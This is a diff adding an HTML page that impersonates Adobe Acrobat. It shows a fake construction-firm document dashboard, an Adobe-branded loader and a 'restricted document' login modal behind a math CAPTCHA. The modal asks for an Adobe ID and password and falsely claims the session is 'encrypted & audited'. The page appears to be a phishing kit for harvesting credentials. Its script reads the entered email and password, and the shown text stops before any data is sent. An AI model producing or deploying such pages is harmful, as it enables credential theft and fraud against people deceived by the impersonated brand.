+        <span style="color:#FA0F00">Invoices</span> <span class="sb-count">4</span>
+      </div>
+    </div>
+    <div class="sidebar-storage">
+      <div class="storage-label">Cloud Storage</div>
+      <div class="storage-track"><div class="storage-fill"></div></div>
+      <div class="storage-info">12.6 GB of 20 GB used</div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <div class="main">
+    <div class="subtoolbar">
+      <span class="subtoolbar-title">All Documents</span>
+      <div class="subtoolbar-tabs">
+        <button class="stab active" onclick="setTab(this,'all')">All</button>
+        <button class="stab" onclick="setTab(this,'recent')">Recent</button>
+        <button class="stab" onclick="setTab(this,'shared')">Shared</button>
+      </div>
+      <div class="subtoolbar-right">
+        <button class="sb-action-btn" onclick="showToast('Sorting applied')">
+          <svg viewBox="0 0 13 13" fill="none"><line x1="1" y1="3" x2="12" y2="3" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/><line x1="3" y1="6.5" x2="10" y2="6.5" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/><line x1="5" y1="10" x2="8" y2="10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
+          Filter
+        </button>
+        <button class="sb-action-btn" onclick="showToast('Sorted by date modified')">
+          <svg viewBox="0 0 13 13" fill="none"><path d="M2 4l3-3 3 3M5 1v9M11 9l-3 3-3-3M8 12V3" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Sort
+        </button>
+        <div class="view-toggle">
+          <button class="vt-btn active" title="List view">
+            <svg viewBox="0 0 13 13" fill="none"><rect x="1" y="2" width="11" height="2" rx=".5" fill="currentColor"/><rect x="1" y="6" width="11" height="2" rx=".5" fill="currentColor"/><rect x="1" y="10" width="7" height="2" rx=".5" fill="currentColor"/></svg>
+          </button>
+          <button class="vt-btn" title="Grid view" onclick="showToast('Grid view coming soon')">
+            <svg viewBox="0 0 13 13" fill="none"><rect x="1" y="1" width="4.5" height="4.5" rx=".5" fill="#999"/><rect x="7.5" y="1" width="4.5" height="4.5" rx=".5" fill="#999"/><rect x="1" y="7.5" width="4.5" height="4.5" rx=".5" fill="#999"/><rect x="7.5" y="7.5" width="4.5" height="4.5" rx=".5" fill="#999"/></svg>
+          </button>
+        </div>
+        <button class="sb-action-btn primary" onclick="showToast('Upload dialog opened')">
+          <svg viewBox="0 0 13 13" fill="none"><path d="M6.5 2v7M4 5l2.5-3L9 5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/><path d="M2 10.5h9" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
+          Upload
+        </button>
+      </div>
+    </div>
+
+    <div class="main-content">
+
+      <!-- RECENTLY OPENED -->
+      <div class="recent-strip">
+        <div class="section-head">
+          <h3>Recently Opened</h3>
+          <a href="#">View all</a>
+        </div>
+        <div class="recent-cards">
+          <!-- HVAC -->
+          <div class="recent-card" onclick="selectDoc(0)">
+            <div class="recent-thumb" style="background:#FFF4EB">
+              <div class="recent-thumb-page">
+                <div class="tp-bar" style="background:#C85000;width:55%"></div>
+                <div class="tp-line" style="margin-top:4px"></div><div class="tp-line s"></div><div class="tp-line"></div><div class="tp-line xs"></div>
+                <div style="height:20px;background:#FFF4EB;border:1px solid #FFD9B3;border-radius:2px;margin-top:4px"></div>
+                <div class="tp-line"></div><div class="tp-line s"></div>
+              </div>
+            </div>
+            <div class="recent-card-info">
+              <div class="rc-name">HVAC_Duct_Layout_B3.pdf</div>
+              <div class="rc-meta">2 min ago</div>
+            </div>
+          </div>
+          <!-- Legal -->
+          <div class="recent-card" onclick="selectDoc(1)">
+            <div class="recent-thumb" style="background:#F3EEFF">
+              <div class="recent-thumb-page">
+                <div class="tp-bar" style="background:#7B4EE0;width:70%"></div>
+                <div class="tp-line" style="margin-top:4px"></div><div class="tp-line"></div><div class="tp-line s"></div><div class="tp-line"></div>
+                <div class="tp-line xs"></div><div class="tp-line"></div><div class="tp-line s"></div>
+              </div>
+            </div>
+            <div class="recent-card-info">
+              <div class="rc-name">NDA_Lafiagi_Projects.pdf</div>
+              <div class="rc-meta">Yesterday</div>
+            </div>
+          </div>
+          <!-- Invoice -->
+          <div class="recent-card" onclick="selectDoc(7)">
+            <div class="recent-thumb" style="background:#FFECEB">
+              <div class="recent-thumb-page">
+                <div class="tp-bar" style="background:#FA0F00;width:80%"></div>
+                <div class="tp-line" style="margin-top:4px"></div><div class="tp-line s"></div>
+                <div style="display:flex;gap:4px;margin-top:4px"><div style="flex:1;height:3px;background:#EEE;border-radius:2px"></div><div style="width:28px;height:3px;background:#FFCDD2;border-radius:2px"></div></div>
+                <div class="tp-line"></div><div class="tp-line s"></div><div class="tp-line xs"></div>
+              </div>
+            </div>
+            <div class="recent-card-info">
+              <div class="rc-name">INV-2025-0041.pdf</div>
+              <div class="rc-meta">Jun 23</div>
+            </div>
+          </div>
+          <!-- Health -->
+          <div class="recent-card" onclick="selectDoc(4)">
+            <div class="recent-thumb" style="background:#EDFAEF">
+              <div class="recent-thumb-page">
+                <div class="tp-bar" style="background:#12805C;width:65%"></div>
+                <div class="tp-line" style="margin-top:4px"></div><div class="tp-line s"></div><div class="tp-line"></div><div class="tp-line xs"></div><div class="tp-line"></div>
+              </div>
+            </div>
+            <div class="recent-card-info">
+              <div class="rc-name">Site_HSE_Report_June.pdf</div>
+              <div class="rc-meta">Jun 20</div>
+            </div>
+          </div>
+          <!-- Structural -->
+          <div class="recent-card" onclick="selectDoc(3)">
+            <div class="recent-thumb" style="background:#FFF9EB">
+              <div class="recent-thumb-page">
+                <div class="tp-bar" style="background:#7A5C00;width:60%"></div>
+                <div class="tp-line" style="margin-top:4px"></div><div class="tp-line s"></div><div class="tp-line xs"></div><div class="tp-line"></div><div class="tp-line s"></div>
+              </div>
+            </div>
+            <div class="recent-card-info">
+              <div class="rc-name">Structural_Load_Calc.pdf</div>
+              <div class="rc-meta">Jun 18</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- DOC TABLE -->
+      <div class="doc-table-wrap">
+        <table class="doc-table" id="docTable">
+          <thead>
+            <tr>
+              <th style="width:36px"><input type="checkbox" id="selectAll" onchange="toggleAll(this)"/></th>
+              <th class="sortable">Name <span class="sort-arrow">↑</span></th>
+              <th>Category</th>
+              <th class="sortable">Modified <span class="sort-arrow"></span></th>
+              <th>Size</th>
+              <th>Shared</th>
+              <th>Status</th>
+              <th style="width:80px">Actions</th>
+            </tr>
+          </thead>
+          <tbody id="tbody"></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div class="right-panel" id="rightPanel">
+    <div class="rp-header">
+      <span class="rp-title" id="rpTitle">Document Details</span>
+      <button class="rp-close-btn" onclick="closePanel()">✕</button>
+    </div>
+    <div class="rp-preview">
+      <div class="rp-page" id="rpPage">
+        <div class="rp-page-hdr" id="rpHdr" style="background:#FA0F00"></div>
+        <div class="rp-page-line"></div>
+        <div class="rp-page-line s"></div>
+        <div class="rp-page-line"></div>
+        <div class="rp-page-line xs"></div>
+        <div class="rp-page-block"><span class="rp-page-block-text">DIAGRAM</span></div>
+        <div class="rp-page-line" style="margin-top:4px"></div>
+        <div class="rp-page-line s"></div>
+      </div>
+    </div>
+    <div class="rp-meta">
+      <div class="rp-doc-name" id="rpDocName">HVAC_Duct_Layout_B3.pdf</div>
+      <div class="rp-doc-tag"><span class="file-tag tag-hvac" id="rpTag">HVAC</span></div>
+      <div class="rp-field"><div class="rp-field-label">Modified</div><div class="rp-field-value" id="rpDate">Jun 26, 2025 · 09:14 AM</div></div>
+      <div class="rp-field"><div class="rp-field-label">Size</div><div class="rp-field-value" id="rpSize">4.2 MB</div></div>
+      <div class="rp-field"><div class="rp-field-label">Pages</div><div class="rp-field-value" id="rpPages">18 pages</div></div>
+      <div class="rp-field"><div class="rp-field-label">Status</div><div class="rp-field-value"><span class="status-pill sp-review" id="rpStatus"><span class="sp-dot"></span>In Review</span></div></div>
+      <div class="rp-divider"></div>
+      <div class="rp-field"><div class="rp-field-label">Owner</div><div class="rp-field-value">You</div></div>
+      <div class="rp-field"><div class="rp-field-label">Shared with</div><div class="rp-field-value" id="rpShared">T. Salami, K. Nwosu</div></div>
+    </div>
+    <div class="rp-actions">
+      <button class="rp-btn rp-btn-primary" onclick="showToast('Opening in Acrobat…')">
+        <svg viewBox="0 0 13 13" fill="none"><rect x="2" y="2" width="9" height="11" rx="1" stroke="currentColor" stroke-width="1.3"/><path d="M4 5.5h5M4 7.5h3.5" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>
+        Open in Acrobat
+      </button>
+      <button class="rp-btn rp-btn-secondary" onclick="showToast('Share dialog opened')">
+        <svg viewBox="0 0 13 13" fill="none"><circle cx="10" cy="3" r="1.5" stroke="currentColor" stroke-width="1.2"/><circle cx="10" cy="10" r="1.5" stroke="currentColor" stroke-width="1.2"/><circle cx="3" cy="6.5" r="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M4.4 7.3l4 1.9M4.4 5.8l4-2" stroke="currentColor" stroke-width="1.2"/></svg>
+        Share &amp; Send
+      </button>
+      <button class="rp-btn rp-btn-ghost" onclick="showToast('Preparing download…')">
+        <svg viewBox="0 0 13 13" fill="none"><path d="M6.5 2v7M4 6.5l2.5 2.5L9 6.5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/><path d="M2 10.5h9" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
+        Download
+      </button>
+    </div>
+    <div class="rp-activity">
+      <div class="rp-activity-title">Activity</div>
+      <div class="activity-item"><div class="act-dot" style="background:#1473E6"></div><div class="act-text"><strong>K. Nwosu</strong> commented · 2h ago</div></div>
+      <div class="activity-item"><div class="act-dot" style="background:#C85000"></div><div class="act-text"><strong>You</strong> uploaded rev 3 · Jun 25</div></div>
+      <div class="activity-item"><div class="act-dot" style="background:#12805C"></div><div class="act-text"><strong>T. Salami</strong> viewed · Jun 24</div></div>
+      <div class="activity-item"><div class="act-dot" style="background:#999"></div><div class="act-text">Created · Jun 20</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- DASHBOARD LOADER -->
+<div class="dash-loader" id="dashLoader">
+  <div class="dash-loader-logo">
+    <svg viewBox="0 0 45 32" fill="none" width="28" height="20">
+      <path d="M0 32 L18 0 L36 32 Z" fill="#FA0F00"/>
+      <path d="M14 32 L32 0 L45 32 Z" fill="#FA0F00" opacity="0.55"/>
+    </svg>
+    <span><em>Adobe</em> Acrobat</span>
+  </div>
+  <div class="dash-loader-msg">Loading your workspace…</div>
+  <div class="dash-loader-email" id="loaderEmail"></div>
+  <div class="dash-loader-track">
+    <div class="dash-loader-bar" id="loaderBar"></div>
+  </div>
+  <div class="dash-loader-dots">
+    <div class="dash-loader-dot"></div>
+    <div class="dash-loader-dot"></div>
+    <div class="dash-loader-dot"></div>
+  </div>
+</div>
+
+<!-- LOGIN MODAL -->
+<div class="modal-overlay" id="loginModal">
+  <div class="modal-card">
+
+    <!-- compact header -->
+    <div class="modal-header">
+      <div style="display:flex;align-items:center;gap:7px;">
+        <svg viewBox="0 0 45 32" fill="none" width="22" height="16"><path d="M0 32 L18 0 L36 32 Z" fill="#FA0F00"/><path d="M14 32 L32 0 L45 32 Z" fill="#FA0F00" opacity="0.55"/></svg>
+        <span style="color:#fff;font-size:12px;font-weight:700;letter-spacing:-.2px;"><em style="color:#FA0F00;font-style:normal">Adobe</em> Acrobat</span>
+        <span style="margin-left:6px;background:rgba(250,15,0,.2);border:1px solid rgba(250,15,0,.4);border-radius:3px;padding:1px 6px;font-size:9px;font-weight:700;letter-spacing:1px;color:rgba(255,255,255,.7);text-transform:uppercase;">Secured</span>
+      </div>
+    </div>
+
+    <!-- body -->
+    <div class="modal-body">
+
+      <!-- lock icon + title inline -->
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+        <div style="width:32px;height:32px;border-radius:50%;background:rgba(250,15,0,.1);border:1.5px solid rgba(250,15,0,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+          <svg viewBox="0 0 20 20" fill="none" width="15" height="15"><rect x="4" y="9" width="12" height="8" rx="1.5" stroke="#FA0F00" stroke-width="1.4"/><path d="M7 9V6.5a3 3 0 0 1 6 0V9" stroke="#FA0F00" stroke-width="1.4" stroke-linecap="round"/><circle cx="10" cy="13" r="1" fill="#FA0F00"/></svg>
+        </div>
+        <div>
+          <div style="font-size:13px;font-weight:700;color:#1C1C1C;line-height:1.2;">Sign in to continue</div>
+          <div style="font-size:10px;color:#767676;margin-top:1px;">This document is restricted. Login required.</div>
+        </div>
+      </div>
+
+      <!-- STEP 1: CAPTCHA -->
+      <div class="captcha-step active" id="captchaStep">
+        <div class="captcha-box">
+          <div class="captcha-box-top">
+            <span class="captcha-box-label">Security Check</span>
+            <span class="captcha-brand-tag"><em>Adobe</em> VERIFY</span>
+          </div>
+          <div class="captcha-math-row">
+            <div class="captcha-equation">
+              <span class="captcha-eq-noise" id="captchaEquation">3 + 4 = ?</span>
+            </div>
+            <input class="captcha-answer-input" id="captchaAnswerInput" type="number" placeholder="?" maxlength="3" autocomplete="off" oninput="onCaptchaInput()"/>
+            <button class="captcha-refresh-btn" onclick="refreshCaptcha()" title="New question">
+              <svg viewBox="0 0 12 12" fill="none"><path d="M10 6A4 4 0 1 1 6 2" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/><path d="M6 2l1.8 1.8L6 5.6" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            </button>
+          </div>
+          <div class="captcha-hint">Solve the equation to prove you're human</div>
+        </div>
+        <div class="captcha-error-msg" id="captchaErrMsg">Incorrect answer — please try again.</div>
+        <button class="captcha-verify-btn" onclick="verifyCaptcha()">
+          <svg viewBox="0 0 11 11" fill="none"><path d="M2 5.5l2.5 2.5L9 2" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Verify &amp; Continue
+        </button>
+      </div>
+
+      <!-- STEP 2: LOGIN FORM (shown after captcha passes) -->
+      <div class="captcha-step" id="loginStep">
+
+        <!-- error -->
+        <div class="modal-error" id="modalError">
+          <svg viewBox="0 0 13 13" fill="none"><circle cx="6.5" cy="6.5" r="5.5" stroke="#C62828" stroke-width="1.2"/><line x1="6.5" y1="4" x2="6.5" y2="7" stroke="#C62828" stroke-width="1.3" stroke-linecap="round"/><circle cx="6.5" cy="9" r=".6" fill="#C62828"/></svg>
+          <span id="modalErrorText">Incorrect email or password.</span>
+        </div>
+
+        <!-- fields -->
+        <div class="modal-field">
+          <label for="loginEmail">Adobe ID / Email</label>
+          <input type="email" id="loginEmail" placeholder="you@adobe.com" autocomplete="email"/>
+        </div>
+        <div class="modal-field">
+          <label for="loginPass">Password</label>
+          <input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/>
+          <a href="#" class="modal-forgot" onclick="return false;">Forgot?</a>
+        </div>
+
+        <!-- submit -->
+        <button class="modal-submit" id="loginBtn" onclick="handleLogin()">
+          <div class="modal-spinner" id="loginSpinner"></div>
+          <svg id="loginIcon" viewBox="0 0 13 13" fill="none"><path d="M11 6.5H4M8.5 4l2.5 2.5L8.5 9" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 2H2.5a.5.5 0 0 0-.5.5v8a.5.5 0 0 0 .5.5H6" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
+          <span id="loginBtnText">Sign In</span>
+        </button>
+
+        <!-- divider + sso -->
+        <div class="modal-divider"><span>or</span></div>
+        <button class="modal-sso" onclick="handleSSO()">
+          <svg viewBox="0 0 16 16" fill="none" width="13" height="13"><rect x="2" y="2" width="5.5" height="5.5" rx="1" fill="#EA4335"/><rect x="8.5" y="2" width="5.5" height="5.5" rx="1" fill="#34A853"/><rect x="2" y="8.5" width="5.5" height="5.5" rx="1" fill="#FBBC05"/><rect x="8.5" y="8.5" width="5.5" height="5.5" rx="1" fill="#4285F4"/></svg>
+          Google / SSO
+        </button>
+
+      </div>
+
+      <p class="modal-footer-text"><a href="#" onclick="return false;">Terms</a> · <a href="#" onclick="return false;">Privacy</a> · Session is encrypted &amp; audited</p>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">
+  <svg viewBox="0 0 14 14" fill="none"><path d="M2 7l3.5 3.5L12 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  <span id="toastMsg">Done</span>
+</div>
+
+<script>
+const docs = [
+  { name:'HVAC_Duct_Layout_B3.pdf',       cat:'HVAC',       tag:'tag-hvac',   tagLabel:'HVAC / MEP',    date:'Jun 26, 2025',  size:'4.2 MB',  pages:'18 pages', status:'sp-review',   statusLabel:'In Review',  shared:['TS','KN'],    color:'#C85000', hdr:'#C85000', block:'DIAGRAM',      activity:['K. Nwosu commented · 2h ago','You uploaded rev 3 · Jun 25','T. Salami viewed · Jun 24'] },
+  { name:'NDA_Lafiagi_Projects_Ltd.pdf',   cat:'Legal',      tag:'tag-legal',  tagLabel:'Legal',          date:'Jun 24, 2025',  size:'1.1 MB',  pages:'9 pages',  status:'sp-pending',  statusLabel:'Pending Sig',shared:['AB'],         color:'#7B4EE0', hdr:'#7B4EE0', block:'SIGNATURE',    activity:['A. Bello sent for signature · Jun 24','You drafted · Jun 23'] },
+  { name:'Subcontractor_Agreement_MEP.pdf',cat:'Legal',      tag:'tag-legal',  tagLabel:'Legal',          date:'Jun 22, 2025',  size:'2.4 MB',  pages:'14 pages', status:'sp-signed',   statusLabel:'Signed',     shared:['OA','KN'],    color:'#7B4EE0', hdr:'#7B4EE0', block:'CONTRACT',     activity:['O. Adeola signed · Jun 22','K. Nwosu signed · Jun 21'] },
+  { name:'Structural_Load_Calculations.pdf',cat:'HVAC',      tag:'tag-struct', tagLabel:'Structural',     date:'Jun 18, 2025',  size:'6.8 MB',  pages:'32 pages', status:'sp-approved', statusLabel:'Approved',   shared:['TS'],         color:'#7A5C00', hdr:'#7A5C00', block:'CALCS',        activity:['T. Salami approved · Jun 18','You submitted · Jun 16'] },
+  { name:'Site_HSE_Report_June2025.pdf',   cat:'Health',     tag:'tag-health', tagLabel:'Health & Safety',date:'Jun 20, 2025',  size:'3.1 MB',  pages:'22 pages', status:'sp-review',   statusLabel:'In Review',  shared:['AB','TS'],    color:'#12805C', hdr:'#12805C', block:'REPORT',       activity:['A. Bello reviewing · Jun 21','You uploaded · Jun 20'] },
+  { name:'PPE_Compliance_Checklist.pdf',   cat:'Health',     tag:'tag-health', tagLabel:'Health & Safety',date:'Jun 15, 2025',  size:'0.9 MB',  pages:'5 pages',  status:'sp-signed',   statusLabel:'Signed',     shared:['KN'],         color:'#12805C', hdr:'#12805C', block:'CHECKLIST',    activity:['K. Nwosu signed · Jun 15','You sent · Jun 14'] },
+  { name:'RFQ_Chiller_Units_2025.pdf',     cat:'Procurement',tag:'tag-proc',   tagLabel:'Procurement',    date:'Jun 17, 2025',  size:'2.0 MB',  pages:'11 pages', status:'sp-pending',  statusLabel:'Pending',    shared:['OA'],         color:'#1473E6', hdr:'#1473E6', block:'RFQ',          activity:['Sent to 3 vendors · Jun 17','You created · Jun 16'] },
+  { name:'INV-2025-0041_Mechanical.pdf',   cat:'Invoice',    tag:'tag-inv',    tagLabel:'Invoice',        date:'Jun 23, 2025',  size:'0.7 MB',  pages:'2 pages',  status:'sp-pending',  statusLabel:'Unpaid',     shared:[],             color:'#FA0F00', hdr:'#FA0F00', block:'INVOICE',      activity:['Generated · Jun 23','Sent to client · Jun 23'] },
+  { name:'INV-2025-0038_HVAC_Install.pdf', cat:'Invoice',    tag:'tag-inv',    tagLabel:'Invoice',        date:'Jun 10, 2025',  size:'0.8 MB',  pages:'3 pages',  status:'sp-approved', statusLabel:'Paid',       shared:[],             color:'#FA0F00', hdr:'#FA0F00', block:'INVOICE',      activity:['Payment received · Jun 14','Sent · Jun 10'] },
+  { name:'Procurement_PO_AHU_Units.pdf',   cat:'Procurement',tag:'tag-proc',   tagLabel:'Procurement',    date:'Jun 12, 2025',  size:'1.4 MB',  pages:'6 pages',  status:'sp-approved', statusLabel:'Approved',   shared:['AB','OA'],    color:'#1473E6', hdr:'#1473E6', block:'P.O.',         activity:['MD approved · Jun 12','Purchasing signed · Jun 11'] },
+  { name:'HVAC_Commissioning_Report.pdf',  cat:'HVAC',       tag:'tag-hvac',   tagLabel:'HVAC / MEP',     date:'Jun 8, 2025',   size:'5.5 MB',  pages:'28 pages', status:'sp-signed',   statusLabel:'Signed',     shared:['TS','KN','AB'],color:'#C85000',hdr:'#C85000', block:'REPORT',       activity:['All parties signed · Jun 9','You submitted · Jun 8'] },
+  { name:'Tender_Doc_Block_C_HVAC.pdf',    cat:'Procurement',tag:'tag-proc',   tagLabel:'Procurement',    date:'May 30, 2025',  size:'8.2 MB',  pages:'47 pages', status:'sp-draft',    statusLabel:'Draft',      shared:[],             color:'#1473E6', hdr:'#1473E6', block:'TENDER',       activity:['You last edited · May 30','Created · May 28'] },
+  { name:'Health_Insurance_Renewal.pdf',   cat:'Health',     tag:'tag-health', tagLabel:'Health & Safety',date:'May 22, 2025',  size:'1.2 MB',  pages:'8 pages',  status:'sp-signed',   statusLabel:'Signed',     shared:[],             color:'#12805C', hdr:'#12805C', block:'POLICY',       activity:['Signed & filed · May 22'] },
+  { name:'Legal_Retainer_Agreement.pdf',   cat:'Legal',      tag:'tag-legal',  tagLabel:'Legal',          date:'May 14, 2025',  size:'1.8 MB',  pages:'12 pages', status:'sp-signed',   statusLabel:'Signed',     shared:['OA'],         color:'#7B4EE0', hdr:'#7B4EE0', block:'AGREEMENT',    activity:['Signed by both parties · May 14'] },
+];
+
+const sharerColors = { TS:'#C85000', KN:'#7B4EE0', AB:'#1473E6', OA:'#12805C' };
+const sharerNames  = { TS:'T. Salami', KN:'K. Nwosu', AB:'A. Bello', OA:'O. Adeola' };
+
+function renderTable() {
+  const tbody = document.getElementById('tbody');
+  tbody.innerHTML = '';
+  docs.forEach((d, i) => {
+    const sharers = d.shared.map(s =>
+      `<div class="sharer" style="background:${sharerColors[s]}" title="${sharerNames[s]}">${s}</div>`
+    ).join('');
+    const row = document.createElement('tr');
+    row.id = 'row-' + i;
+    row.innerHTML = `
+      <td><input type="checkbox" class="row-cb" data-i="${i}" onchange="rowCheck(this)"/></td>
+      <td>
+        <div class="file-cell">
+          <div class="file-icon fi-pdf">
+            <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
+              <rect width="10" height="10" fill="${d.color}" rx="1"/>
+            </svg>
+            <span class="file-icon-label">PDF</span>
+          </div>
+          <span class="file-name">${d.name}</span>
+        </div>
+      </td>
+      <td><span class="file-tag ${d.tag}">${d.tagLabel}</span></td>
+      <td class="file-date">${d.date}</td>
+      <td class="file-size">${d.size}</td>
+      <td><div class="file-shared">${sharers || '<span style="font-size:11px;color:#bbb">—</span>'}</div></td>
+      <td><span class="status-pill ${d.status}"><span class="sp-dot"></span>${d.statusLabel}</span></td>
+      <td>
+        <div class="row-actions">
+          <button class="row-btn" title="Open" onclick="event.stopPropagation();showToast('Opening ${d.name}')">
+            <svg viewBox="0 0 13 13" fill="none"><rect x="2" y="1.5" width="9" height="10" rx="1" stroke="#555" stroke-width="1.2"/><path d="M4 5h5M4 7h3" stroke="#555" stroke-width="1.1" stroke-linecap="round"/></svg>
+          </button>
+          <button class="row-btn" title="Share" onclick="event.stopPropagation();showToast('Share: ${d.name}')">
+            <svg viewBox="0 0 13 13" fill="none"><circle cx="10" cy="3" r="1.3" stroke="#555" stroke-width="1.1"/><circle cx="10" cy="10" r="1.3" stroke="#555" stroke-width="1.1"/><circle cx="3" cy="6.5" r="1.3" stroke="#555" stroke-width="1.1"/><path d="M4.2 7.1l4 1.8M4.2 6l4-2" stroke="#555" stroke-width="1.1"/></svg>
+          </button>
+          <button class="row-btn" title="Download" onclick="event.stopPropagation();showToast('Downloading…')">
+            <svg viewBox="0 0 13 13" fill="none"><path d="M6.5 2v6M4.5 6l2 2 2-2" stroke="#555" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M2 10.5h9" stroke="#555" stroke-width="1.2" stroke-linecap="round"/></svg>
+          </button>
+        </div>
+      </td>
+    `;
+    row.addEventListener('click', () => selectDoc(i));
+    tbody.appendChild(row);
+  });
+}
+
+function selectDoc(i) {
+  document.querySelectorAll('#tbody tr').forEach(r => r.classList.remove('selected'));
+  const row = document.getElementById('row-' + i);
+  if (row) row.classList.add('selected');
+  const d = docs[i];
+  document.getElementById('rpTitle').textContent = d.cat + ' Document';
+  document.getElementById('rpDocName').textContent = d.name;
+  document.getElementById('rpTag').className = 'file-tag ' + d.tag;
+  document.getElementById('rpTag').textContent = d.tagLabel;
+  document.getElementById('rpDate').textContent = d.date + ' · 09:14 AM';
+  document.getElementById('rpSize').textContent = d.size;
+  document.getElementById('rpPages').textContent = d.pages;
+  document.getElementById('rpStatus').className = 'status-pill ' + d.status;
+  document.getElementById('rpStatus').innerHTML = '<span class="sp-dot"></span>' + d.statusLabel;
+  document.getElementById('rpHdr').style.background = d.hdr;
+  document.getElementById('rpShared').textContent = d.shared.map(s => sharerNames[s]).join(', ') || 'Only you';
+  document.querySelector('.rp-page-block-text').textContent = d.block;
+
+  // update activity
+  const actDiv = document.querySelector('.rp-activity');
+  const colors = ['#1473E6','#C85000','#12805C','#999','#7B4EE0'];
+  actDiv.innerHTML = '<div class="rp-activity-title">Activity</div>' +
+    d.activity.map((a, idx) => `<div class="activity-item"><div class="act-dot" style="background:${colors[idx%colors.length]}"></div><div class="act-text">${a}</div></div>`).join('');
+}
+
+function closePanel() { document.querySelectorAll('#tbody tr').forEach(r => r.classList.remove('selected')); }
+
+function setNav(el) { document.querySelectorAll('.sb-item').forEach(x => x.classList.remove('active')); el.classList.add('active'); }
+function setTab(el, t) { document.querySelectorAll('.stab').forEach(x => x.classList.remove('active')); el.classList.add('active'); }
+function toggleAll(cb) { document.querySelectorAll('.row-cb').forEach(c => c.checked = cb.checked); }
+function rowCheck(cb) { const all = document.querySelectorAll('.row-cb'); const checked = [...all].filter(c=>c.checked); document.getElementById('selectAll').indeterminate = checked.length > 0 && checked.length < all.length; }
+
+let toastTimer;
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  document.getElementById('toastMsg').textContent = msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 2200);
+}
+
+renderTable();
+selectDoc(0);
+
+// ── CAPTCHA LOGIC (math) ──
+let captchaPassed = false;
+let captchaAnswer = 0;
+let captchaAttempts = 0;
+
+function refreshCaptcha() {
+  const ops = ['+', '-', '×'];
+  const op  = ops[Math.floor(Math.random() * ops.length)];
+  let a, b, answer;
+  if (op === '+') { a = Math.floor(Math.random()*9)+1; b = Math.floor(Math.random()*9)+1; answer = a + b; }
+  else if (op === '-') { a = Math.floor(Math.random()*8)+3; b = Math.floor(Math.random()*(a-1))+1; answer = a - b; }
+  else { a = Math.floor(Math.random()*5)+2; b = Math.floor(Math.random()*5)+2; answer = a * b; }
+  captchaAnswer = answer;
+  document.getElementById('captchaEquation').textContent = `${a} ${op} ${b} = ?`;
+  const inp = document.getElementById('captchaAnswerInput');
+  inp.value = '';
+  inp.className = 'captcha-answer-input';
+  inp.focus();
+  document.getElementById('captchaErrMsg').classList.remove('show');
+}
+
+function onCaptchaInput() {
+  const inp = document.getElementById('captchaAnswerInput');
+  inp.className = 'captcha-answer-input';
+  document.getElementById('captchaErrMsg').classList.remove('show');
+}
+
+function verifyCaptcha() {
+  const inp = document.getElementById('captchaAnswerInput');
+  const val = parseInt(inp.value, 10);
+
+  if (isNaN(val)) {
+    document.getElementById('captchaErrMsg').classList.add('show');
+    inp.focus(); return;
+  }
+
+  if (val === captchaAnswer) {
+    // ✅ Correct
+    inp.className = 'captcha-answer-input correct';
+    document.getElementById('captchaErrMsg').classList.remove('show');
+    captchaPassed = true;
+    setTimeout(() => {
+      document.getElementById('captchaStep').classList.remove('active');
+      document.getElementById('captchaStep').style.display = 'none';
+      const loginStep = document.getElementById('loginStep');
+      loginStep.classList.add('active');
+      const prefill = document.getElementById('loginEmail').value;
+      setTimeout(() => prefill ? document.getElementById('loginPass').focus() : document.getElementById('loginEmail').focus(), 80);
+    }, 420);
+  } else {
+    // ❌ Wrong
+    inp.className = 'captcha-answer-input wrong';
+    document.getElementById('captchaErrMsg').classList.add('show');
+    captchaAttempts++;
+    inp.value = '';
+    // Refresh question after 2 failed attempts
+    if (captchaAttempts >= 2) { captchaAttempts = 0; setTimeout(refreshCaptcha, 600); }
+    else inp.focus();
+  }
+}
+
+// Allow Enter key in captcha answer
+document.addEventListener('DOMContentLoaded', () => {});
+window.addEventListener('load', () => {
+  refreshCaptcha();
+  const ai = document.getElementById('captchaAnswerInput');
+  if (ai) ai.addEventListener('keydown', e => { if (e.key === 'Enter') verifyCaptcha(); });
+});
+
+// ── LOGIN MODAL LOGIC ──
+let loginAttemptCount = 0;
+
+function handleLogin() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const pass  = document.getElementById('loginPass').value;
+  const err   = document.getElementById('modalError');
+  const btn   = document.getElementById('loginBtn');
+  const spinner = document.getElementById('loginSpinner');
+  const icon  = document.getElementById('loginIcon');
+  const txt   = document.getElementById('loginBtnText');
+
+  err.classList.remove('show');
+
+  if (!email || !pass) {
+    document.getElementById('modalErrorText').textContent = 'Please enter your Adobe ID and password.';
+    err.classList.add('show');
+    if (!email) document.getElementById('loginEmail').focus();
+    else document.getElementById('loginPass').focus();
+    return;
+  }
+
+  // Email format validation
